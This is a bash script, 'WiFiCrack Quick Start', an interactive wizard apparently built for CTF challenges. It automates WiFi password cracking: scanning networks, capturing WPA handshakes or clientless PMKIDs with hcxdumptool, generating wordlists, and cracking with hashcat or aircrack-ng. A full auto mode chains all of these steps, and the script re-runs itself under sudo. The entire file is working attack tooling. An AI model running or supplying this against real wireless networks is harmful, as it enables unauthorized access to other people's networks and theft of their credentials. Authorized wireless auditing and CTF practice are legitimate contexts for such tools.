#!/bin/bash
#
# WiFiCrack Quick Start Script
# Interactive wizard for CTF challenges
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Banner
echo -e "${CYAN}"
cat << "EOF"
╦ ╦╦╔═╗╦╔═╗┬─┐┌─┐┌─┐┬┌─
║║║║╠╣ ║║  ├┬┘├─┤│  ├┴┐
╚╩╝╩╚  ╩╚═╝┴└─┴ ┴└─┘┴ ┴
Quick Start - CTF Mode
EOF
echo -e "${NC}"

# Check if running as root for capture commands
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}This script needs root privileges for WiFi operations${NC}"
        echo -e "${YELLOW}Restarting with sudo...${NC}"
        exec sudo "$0" "$@"
    fi
}

# Detect wireless interface
detect_interface() {
    echo -e "${CYAN}[*] Detecting wireless interfaces...${NC}"

    # Get all wireless interfaces
    INTERFACES=($(iw dev | grep Interface | awk '{print $2}'))

    if [ ${#INTERFACES[@]} -eq 0 ]; then
        echo -e "${RED}No wireless interfaces found!${NC}"
        echo -e "${YELLOW}Make sure your wireless adapter is connected${NC}"
        exit 1
    fi

    if [ ${#INTERFACES[@]} -eq 1 ]; then
        INTERFACE=${INTERFACES[0]}
        echo -e "${GREEN}Found interface: $INTERFACE${NC}"
    else
        echo -e "${CYAN}Multiple interfaces found:${NC}"
        for i in "${!INTERFACES[@]}"; do
            echo -e "  $((i+1)). ${INTERFACES[$i]}"
        done

        read -p "$(echo -e ${CYAN}Select interface [1]: ${NC})" choice
        choice=${choice:-1}
        INTERFACE=${INTERFACES[$((choice-1))]}
        echo -e "${GREEN}Selected: $INTERFACE${NC}"
    fi
}

# Main menu
main_menu() {
    echo -e "\n${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║                   WiFiCrack Quick Start                      ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${YELLOW}What would you like to do?${NC}\n"
    echo -e "  ${GREEN}1.${NC} Scan for WiFi networks"
    echo -e "  ${GREEN}2.${NC} Capture EAPOL handshake (traditional)"
    echo -e "  ${GREEN}3.${NC} Capture PMKID (clientless - faster)"
    echo -e "  ${GREEN}4.${NC} Crack captured handshake"
    echo -e "  ${GREEN}5.${NC} Generate custom wordlist"
    echo -e "  ${GREEN}6.${NC} Full auto mode (scan + capture + crack)"
    echo -e "  ${GREEN}7.${NC} Show captured files"
    echo -e "  ${GREEN}8.${NC} Exit"

    echo -e ""
    read -p "$(echo -e ${CYAN}Enter choice [1-8]: ${NC})" choice

    case $choice in
        1) scan_networks ;;
        2) capture_handshake ;;
        3) capture_pmkid ;;
        4) crack_password ;;
        5) generate_wordlist ;;
        6) auto_mode ;;
        7) show_files ;;
        8) exit 0 ;;
        *) echo -e "${RED}Invalid choice${NC}"; main_menu ;;
    esac
}

# Scan networks
scan_networks() {
    check_root
    detect_interface

    echo -e "\n${CYAN}[*] Scanning for networks...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop scanning${NC}\n"

    ./wificrack.py capture -i "$INTERFACE" --scan

    echo -e "\n${GREEN}Scan complete!${NC}"
    read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
    main_menu
}

# Capture handshake
capture_handshake() {
    check_root
    detect_interface

    echo -e "\n${CYAN}[*] Capture EAPOL Handshake${NC}\n"

    read -p "$(echo -e ${CYAN}Scan for networks first? [Y/n]: ${NC})" scan
    scan=${scan:-Y}

    if [[ $scan =~ ^[Yy]$ ]]; then
        ./wificrack.py capture -i "$INTERFACE" --scan
        echo ""
    fi

    read -p "$(echo -e ${CYAN}Enter target BSSID (or press Enter to scan): ${NC})" BSSID

    if [ -z "$BSSID" ]; then
        echo -e "${YELLOW}Entering interactive mode...${NC}"
        ./wificrack.py capture -i "$INTERFACE" --scan -o "handshake_$(date +%Y%m%d_%H%M%S)"
    else
        read -p "$(echo -e ${CYAN}Enter channel: ${NC})" CHANNEL
        read -p "$(echo -e ${CYAN}Output filename [handshake]: ${NC})" OUTPUT
        OUTPUT=${OUTPUT:-handshake}

        ./wificrack.py capture -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -o "$OUTPUT"
    fi

    echo -e "\n${GREEN}Capture complete!${NC}"
    read -p "$(echo -e ${CYAN}Crack the password now? [y/N]: ${NC})" crack

    if [[ $crack =~ ^[Yy]$ ]]; then
        crack_password
    else
        main_menu
    fi
}

# Capture PMKID
capture_pmkid() {
    check_root
    detect_interface

    echo -e "\n${CYAN}[*] Capture PMKID (Clientless Attack)${NC}\n"
    echo -e "${YELLOW}This method doesn't require clients to be connected!${NC}\n"

    # Check if hcxdumptool is installed
    if ! command -v hcxdumptool &> /dev/null; then
        echo -e "${RED}hcxdumptool not installed!${NC}"
        echo -e "${YELLOW}Run ./install-wificrack.sh to install it${NC}"
        read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
        main_menu
        return
    fi

    OUTPUT="pmkid_$(date +%Y%m%d_%H%M%S)"

    read -p "$(echo -e ${CYAN}Capture duration in seconds [60]: ${NC})" DURATION
    DURATION=${DURATION:-60}

    echo -e "${CYAN}Starting PMKID capture...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop${NC}\n"

    sudo hcxdumptool -i "$INTERFACE" -o "${OUTPUT}.pcapng" --enable_status=15 &
    PID=$!

    sleep "$DURATION" 2>/dev/null || true
    kill $PID 2>/dev/null || true

    # Convert to hashcat format
    if [ -f "${OUTPUT}.pcapng" ]; then
        echo -e "\n${CYAN}Converting to hashcat format...${NC}"

        if command -v hcxpcapngtool &> /dev/null; then
            hcxpcapngtool -o "${OUTPUT}.22000" "${OUTPUT}.pcapng"

            if [ -f "${OUTPUT}.22000" ] && [ -s "${OUTPUT}.22000" ]; then
                echo -e "${GREEN}Successfully captured and converted!${NC}"
                echo -e "${GREEN}File: ${OUTPUT}.22000${NC}"

                read -p "$(echo -e ${CYAN}Crack the password now? [y/N]: ${NC})" crack

                if [[ $crack =~ ^[Yy]$ ]]; then
                    crack_password "${OUTPUT}.22000"
                else
                    main_menu
                fi
            else
                echo -e "${RED}No PMKID captured. Try again or use traditional handshake capture.${NC}"
                read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
                main_menu
            fi
        else
            echo -e "${RED}hcxpcapngtool not found!${NC}"
            echo -e "${YELLOW}Run ./install-wificrack.sh to install it${NC}"
            read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
            main_menu
        fi
    else
        echo -e "${RED}Capture failed${NC}"
        read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
        main_menu
    fi
}

# Crack password
crack_password() {
    local HASHFILE="$1"

    echo -e "\n${CYAN}[*] Crack Password${NC}\n"

    # Find available hash files if not provided
    if [ -z "$HASHFILE" ]; then
        echo -e "${CYAN}Available capture files:${NC}"

        HASH_FILES=($(ls *.22000 2>/dev/null || true))
        CAP_FILES=($(ls *.cap 2>/dev/null || true))

        FILES=("${HASH_FILES[@]}" "${CAP_FILES[@]}")

        if [ ${#FILES[@]} -eq 0 ]; then
            echo -e "${RED}No capture files found!${NC}"
            echo -e "${YELLOW}Capture a handshake first${NC}"
            read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
            main_menu
            return
        fi

        for i in "${!FILES[@]}"; do
            echo -e "  $((i+1)). ${FILES[$i]}"
        done

        read -p "$(echo -e ${CYAN}Select file [1]: ${NC})" choice
        choice=${choice:-1}
        HASHFILE=${FILES[$((choice-1))]}
    fi

    echo -e "${GREEN}Using: $HASHFILE${NC}\n"

    # Select wordlist
    echo -e "${CYAN}Select wordlist:${NC}"
    echo -e "  ${GREEN}1.${NC} Quick test (auto-generated common passwords)"
    echo -e "  ${GREEN}2.${NC} RockYou (wordlists/rockyou.txt)"
    echo -e "  ${GREEN}3.${NC} Custom wordlist"
    echo -e "  ${GREEN}4.${NC} Generate new wordlist"

    read -p "$(echo -e ${CYAN}Enter choice [1]: ${NC})" wl_choice
    wl_choice=${wl_choice:-1}

    case $wl_choice in
        1)
            WORDLIST="quick-test.txt"
            echo -e "${CYAN}Generating quick test wordlist...${NC}"
            ./wificrack.py wordlist -o "$WORDLIST" -p password admin welcome qwerty
            ;;
        2)
            WORDLIST="wordlists/rockyou.txt"
            if [ ! -f "$WORDLIST" ]; then
                echo -e "${YELLOW}RockYou not found. Using quick test instead.${NC}"
                WORDLIST="quick-test.txt"
                ./wificrack.py wordlist -o "$WORDLIST"
            fi
            ;;
        3)
            read -p "$(echo -e ${CYAN}Enter wordlist path: ${NC})" WORDLIST
            ;;
        4)
            read -p "$(echo -e ${CYAN}Output filename: ${NC})" WORDLIST
            read -p "$(echo -e ${CYAN}Base patterns (space-separated): ${NC})" PATTERNS
            ./wificrack.py wordlist -o "$WORDLIST" -p $PATTERNS
            ;;
    esac

    # Select cracking tool
    echo -e "\n${CYAN}Select cracking method:${NC}"
    echo -e "  ${GREEN}1.${NC} Hashcat (fastest, GPU-accelerated)"
    echo -e "  ${GREEN}2.${NC} Aircrack-ng (CPU-based)"

    read -p "$(echo -e ${CYAN}Enter choice [1]: ${NC})" crack_choice
    crack_choice=${crack_choice:-1}

    echo -e "\n${CYAN}Starting password cracking...${NC}"
    echo -e "${YELLOW}This may take a while...${NC}\n"

    if [ "$crack_choice" = "1" ]; then
        if [[ "$HASHFILE" == *.22000 ]]; then
            ./wificrack.py crack -f "$HASHFILE" -w "$WORDLIST" --hashcat
        else
            echo -e "${YELLOW}Converting to hashcat format...${NC}"
            hcxpcapngtool -o "${HASHFILE%.cap}.22000" "$HASHFILE" 2>/dev/null || true

            if [ -f "${HASHFILE%.cap}.22000" ]; then
                ./wificrack.py crack -f "${HASHFILE%.cap}.22000" -w "$WORDLIST" --hashcat
            else
                echo -e "${YELLOW}Conversion failed, using aircrack-ng...${NC}"
                ./wificrack.py crack -f "$HASHFILE" -w "$WORDLIST" --aircrack
            fi
        fi
    else
        ./wificrack.py crack -f "$HASHFILE" -w "$WORDLIST" --aircrack
    fi

    echo -e "\n${GREEN}Cracking complete!${NC}"
    read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
    main_menu
}

# Generate wordlist
generate_wordlist() {
    echo -e "\n${CYAN}[*] Generate Custom Wordlist${NC}\n"

    read -p "$(echo -e ${CYAN}Output filename: ${NC})" OUTPUT

    echo -e "\n${YELLOW}Enter base patterns (e.g., CompanyName, RouterName, etc.)${NC}"
    echo -e "${YELLOW}Press Enter on empty line when done${NC}\n"

    PATTERNS=()
    while true; do
        read -p "$(echo -e ${CYAN}Pattern: ${NC})" pattern
        [ -z "$pattern" ] && break
        PATTERNS+=("$pattern")
    done

    if [ ${#PATTERNS[@]} -gt 0 ]; then
        ./wificrack.py wordlist -o "$OUTPUT" -p "${PATTERNS[@]}"

        echo -e "\n${GREEN}Wordlist generated: $OUTPUT${NC}"
        echo -e "${CYAN}Lines: $(wc -l < "$OUTPUT")${NC}"
    else
        echo -e "${YELLOW}Using default patterns...${NC}"
        ./wificrack.py wordlist -o "$OUTPUT"
    fi

    read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
    main_menu
}

# Auto mode
auto_mode() {
    check_root
    detect_interface

    echo -e "\n${CYAN}[*] Full Auto Mode${NC}\n"
    echo -e "${YELLOW}This will:${NC}"
    echo -e "  1. Scan for networks"
    echo -e "  2. Capture handshake"
    echo -e "  3. Generate wordlist"
    echo -e "  4. Crack password"
    echo -e ""

    read -p "$(echo -e ${CYAN}Continue? [y/N]: ${NC})" confirm

    if [[ ! $confirm =~ ^[Yy]$ ]]; then
        main_menu
        return
    fi

    # Scan
    echo -e "\n${CYAN}[1/4] Scanning networks...${NC}"
    ./wificrack.py capture -i "$INTERFACE" --scan

    # Capture
    echo -e "\n${CYAN}[2/4] Capturing handshake...${NC}"
    OUTPUT="auto_$(date +%Y%m%d_%H%M%S)"
    ./wificrack.py capture -i "$INTERFACE" --scan -o "$OUTPUT"

    # Generate wordlist
    echo -e "\n${CYAN}[3/4] Generating wordlist...${NC}"
    ./wificrack.py wordlist -o "auto_wordlist.txt"

    # Crack
    echo -e "\n${CYAN}[4/4] Cracking password...${NC}"

    if [ -f "${OUTPUT}.22000" ]; then
        ./wificrack.py crack -f "${OUTPUT}.22000" -w "auto_wordlist.txt" --hashcat
    elif [ -f "${OUTPUT}-01.cap" ]; then
        ./wificrack.py crack -f "${OUTPUT}-01.cap" -w "auto_wordlist.txt" --aircrack
    else
        echo -e "${RED}No capture file found${NC}"
    fi

    echo -e "\n${GREEN}Auto mode complete!${NC}"
    read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
    main_menu
}

# Show files
show_files() {
    echo -e "\n${CYAN}[*] Captured Files${NC}\n"

    echo -e "${YELLOW}Hashcat format (.22000):${NC}"
    ls -lh *.22000 2>/dev/null || echo -e "${RED}  None found${NC}"

    echo -e "\n${YELLOW}Capture files (.cap, .pcapng):${NC}"
    ls -lh *.cap *.pcap *.pcapng 2>/dev/null || echo -e "${RED}  None found${NC}"

    echo -e "\n${YELLOW}Wordlists (.txt):${NC}"
    ls -lh *.txt wordlists/*.txt 2>/dev/null || echo -e "${RED}  None found${NC}"

    echo -e ""
    read -p "$(echo -e ${CYAN}Press Enter to continue...${NC})"
    main_menu
}

# Start
main_menu
